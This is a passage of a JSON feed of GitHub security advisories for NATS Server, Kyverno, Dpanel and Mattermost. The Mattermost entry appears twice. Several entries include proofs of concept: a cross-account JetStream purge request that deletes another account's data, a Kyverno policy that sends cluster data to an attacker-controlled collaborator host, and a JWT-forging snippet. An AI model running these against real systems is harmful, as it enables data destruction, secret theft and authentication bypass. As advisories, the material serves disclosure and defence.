\"s1\"\n11:50:05 Published 5 bytes to \"s1\"\n\n# Messages are correctly persisted on account TEST, and not on TEST2:\n$ nats -s nats://localhost:4233 --user a --password a stream ls\n╭───────────────────────────────────────────────────────────────────────────────╮\n│                                    Streams                                    │\n├─────────┬─────────────┬─────────────────────┬──────────┬───────┬──────────────┤\n│ Name    │ Description │ Created             │ Messages │ Size  │ Last Message │\n├─────────┼─────────────┼─────────────────────┼──────────┼───────┼──────────────┤\n│ stream1 │             │ 2025-03-02 11:48:49 │ 3        │ 111 B │ 46.01s       │\n╰─────────┴─────────────┴─────────────────────┴──────────┴───────┴──────────────╯\n\n$ nats -s nats://localhost:4233 --user b --password b stream ls\nNo Streams defined\n\n$ du -h tmp/jetstream\n  0B\ttmp/jetstream/TEST/streams/stream1/obs\n8.0K\ttmp/jetstream/TEST/streams/stream1/msgs\n 16K\ttmp/jetstream/TEST/streams/stream1\n 16K\ttmp/jetstream/TEST/streams\n 16K\ttmp/jetstream/TEST\n 16K\ttmp/jetstream\n\n# User b (account TEST2) sends a PURGE command for account TEST (user a).\n# According to the source comments, user b shouldn't even be able to purge it's own account, much less another one.\n$ nats -s nats://localhost:4233 --user b --password b request '$JS.API.ACCOUNT.PURGE.TEST' ''\n11:54:50 Sending request on \"$JS.API.ACCOUNT.PURGE.TEST\"\n11:54:50 Received with rtt 1.528042ms\n{\"type\":\"io.nats.jetstream.api.v1.account_purge_response\",\"initiated\":true}\n\n# From nats-server in response to the purge request:\n[90608] 2025/03/02 11:54:50.277144 [INF] Purge request for account TEST (streams: 1, hasAccount: true)\n\n# And indeed, the stream data is gone on account TEST:\n$ du -h tmp/jetstream\n  0B\ttmp/jetstream\n\n$ nats -s nats://localhost:4233 --user a --password a stream ls\nNo Streams defined\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/nats-io/nats-server/security/advisories/GHSA-fhg8-qxh5-7q3w\">https://github.com/nats-io/nats-server/security/advisories/GHSA-fhg8-qxh5-7q3w</a></li>\n<li><a href=\"https://advisories.nats.io/CVE/secnote-2025-01.txt\">https://advisories.nats.io/CVE/secnote-2025-01.txt</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-30215\">https://nvd.nist.gov/vuln/detail/CVE-2025-30215</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2025/04/08/5\">http://www.openwall.com/lists/oss-security/2025/04/08/5</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-fhg8-qxh5-7q3w\">https://github.com/advisories/GHSA-fhg8-qxh5-7q3w</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-fhg8-qxh5-7q3w",
            "title": "[github.com/nats-io/nats-server/v2] NATS Server may fail to authorize certain Jetstream admin APIs",
            "date_modified": "2025-04-16T13:12:42.000Z",
            "date_published": "2025-04-15T21:45:00.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-fhg8-qxh5-7q3w"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>An attacker with the ability to create Kyverno policies in a Kubernetes cluster can use Service Call functionality to perform SSRF to a server under their control in order to exfiltrate data.</p>\n<h3 id=\"details\">Details</h3>\n<p>According to the documentation, Service Call is intended to address services located inside the Kubernetes cluster, but this method can also resolve external addresses, which allows making requests outside the Kubernetes cluster.</p>\n<p><a href=\"https://kyverno.io/docs/writing-policies/external-data-sources/#variables-from-service-calls\">https://kyverno.io/docs/writing-policies/external-data-sources/#variables-from-service-calls</a></p>\n<h3 id=\"poc\">PoC</h3>\n<p>Create a slightly modified Cluster Policy from the documentation. In the url we specify the address of a server controlled by the attacker, for example Burp Collaborator.</p>\n<pre><code class=\"language-yaml\">apiVersion: kyverno.io/v1\nkind: ClusterPolicy\nmetadata:\n  name: check-namespaces      \nspec:\n  rules:\n  - name: call-extension\n    match:\n      any:\n      - resources:\n          kinds:\n          - ConfigMap\n    context:\n    - name: result\n      apiCall:\n        method: POST\n        data:\n        - key: namespace\n          value: \"{{request.namespace}}\"\n        service:\n          url: http://bo3gyn4qwyjnrx87fjnrsd4p7gd71xpm.oastify.com/payload          \n    validate:\n      message: \"namespace {{request.namespace}} is not allowed\"\n      deny:\n        conditions:\n          all:\n          - key: \"{{ result.allowed }}\"\n            operator: Equals\n            value: false\n</code></pre>\n<p>Now let's create some configmap:</p>\n<pre><code class=\"language-bash\">kubectl create configmap special-config --from-literal=special.how=very --from-literal=special.type=charm\n</code></pre>\n<p>Look at the Burp Collaborator logs:\n<img src=\"https://github.com/user-attachments/assets/9445a71a-6687-430a-8476-3fd546bc2bf2\" alt=\"Снимок экрана 2025-02-21 в 17 31 25\" width=\"723\"></p>\n<h3 id=\"impact\">Impact</h3>\n<p>An attacker creating such a policy can obtain the contents of all Kubernetes resources created in the cluster, including secrets containing sensitive information.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/kyverno/kyverno/security/advisories/GHSA-459x-q9hg-4gpq\">https://github.com/kyverno/kyverno/security/advisories/GHSA-459x-q9hg-4gpq</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-459x-q9hg-4gpq\">https://github.com/advisories/GHSA-459x-q9hg-4gpq</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-459x-q9hg-4gpq",
            "title": "[github.com/kyverno/kyverno] Kyverno vulnerable to SSRF via Service Calls",
            "date_modified": "2025-04-15T21:19:37.000Z",
            "date_published": "2025-04-15T21:19:37.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-459x-q9hg-4gpq"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The Dpanel service contains a hardcoded JWT secret in its default configuration, allowing attackers to generate valid JWT tokens and compromise the host machine.</p>\n<h3 id=\"details\">Details</h3>\n<p>The Dpanel service, when initiated using its default configuration, includes a hardcoded JWT secret embedded directly within its source code. This security flaw allows attackers to analyze the source code, discover the embedded secret, and craft legitimate JWT tokens. By forging these tokens, an attacker can successfully bypass authentication mechanisms, impersonate privileged users, and gain unauthorized administrative access. Consequently, this enables full control over the host machine, potentially leading to severe consequences such as sensitive data exposure, unauthorized command execution, privilege escalation, or further lateral movement within the network environment. It is recommended to replace the hardcoded secret with a securely generated value and load it from secure configuration storage to mitigate this vulnerability.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>The core code snippet is shown below:</p>\n<pre><code class=\"language-python\">import jwt\n\ndef generate_jwt(appname):\n\n    payload = {\n        \"SECRET_KEY\"：\"SECRET_VALUE\",\n    }\n    print(\"appname:\", appname)\n    print(\"payload:\", str(payload))\n    token = jwt.encode(payload, SECRET_KEY.format(APP_NAME=appname), algorithm=\"HS256\")\n    return token\n\nappname = \"SECRET_KEY\"\ntoken = generate_jwt(appname)\nprint(\"url token:\", token)\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>Attackers who successfully exploit this vulnerability can write arbitrary files to the host machine's file system, and all users with Dpanel versions less than 1.6.1 are affected.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/donknap/dpanel/security/advisories/GHSA-j752-cjcj-w847\">https://github.com/donknap/dpanel/security/advisories/GHSA-j752-cjcj-w847</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-30206\">https://nvd.nist.gov/vuln/detail/CVE-2025-30206</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-j752-cjcj-w847\">https://github.com/advisories/GHSA-j752-cjcj-w847</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-j752-cjcj-w847",
            "title": "[github.com/donknap/dpanel] Dpanel's hard-coded JWT secret leads to remote code execution",
            "date_modified": "2025-04-15T21:41:22.000Z",
            "date_published": "2025-04-15T14:17:25.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-j752-cjcj-w847"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Mattermost versions 10.5.x &lt;= 10.5.1, 10.4.x &lt;= 10.4.3, 9.11.x &lt;= 9.11.9 fail to invalidate the cache when a user account is converted to a bot which allows an attacker to login to the bot exactly one time via normal credentials.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-2475\">https://nvd.nist.gov/vuln/detail/CVE-2025-2475</a></li>\n<li><a href=\"https://mattermost.com/security-updates\">https://mattermost.com/security-updates</a></li>\n<li><a href=\"https://github.com/mattermost/mattermost/commit/fd356b62b4dd3318d2c8019d2310abdd6ce24c8c\">https://github.com/mattermost/mattermost/commit/fd356b62b4dd3318d2c8019d2310abdd6ce24c8c</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6rqh-8465-2xcw\">https://github.com/advisories/GHSA-6rqh-8465-2xcw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6rqh-8465-2xcw",
            "title": "[github.com/mattermost/mattermost/server/v8] Mattermost vulnerable to Incorrect Implementation of Authentication Algorithm",
            "date_modified": "2025-04-14T22:00:57.000Z",
            "date_published": "2025-04-14T15:31:59.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6rqh-8465-2xcw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Mattermost versions 10.5.x &lt;= 10.5.1, 10.4.x &lt;= 10.4.3, 9.11.x &lt;= 9.11.9 fail to invalidate the cache when a user account is converted to a bot which allows an attacker to login to the bot exactly one time via normal credentials.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-2475\">https://nvd.nist.gov/vuln/detail/CVE-2025-2475</a></li>\n<li><a href=\"https://mattermost.com/security-updates\">https://mattermost.com/security-updates</a></li>\n<li><a href=\"https://github.com/mattermost/mattermost/commit/fd356b62b4dd3318d2c8019d2310abdd6ce24c8c\">https://github.com/mattermost/mattermost/commit/fd356b62b4dd3318d2c8019d2310abdd6ce24c8c</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6rqh-8465-2xcw\">https://github.com/advisories/GHSA-6rqh-8465-2xcw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6rqh-8465-2xcw",
            "title": "[github.com/mattermost/mattermost/server/v8] Mattermost vulnerable to Incorrect Implementation of Authentication Algorithm",
            "date_modified": "2025-04-14T22:00:57.000Z",
            "date_published": "2025-04-14T15:31:59.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6rqh-8465-2xcw"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}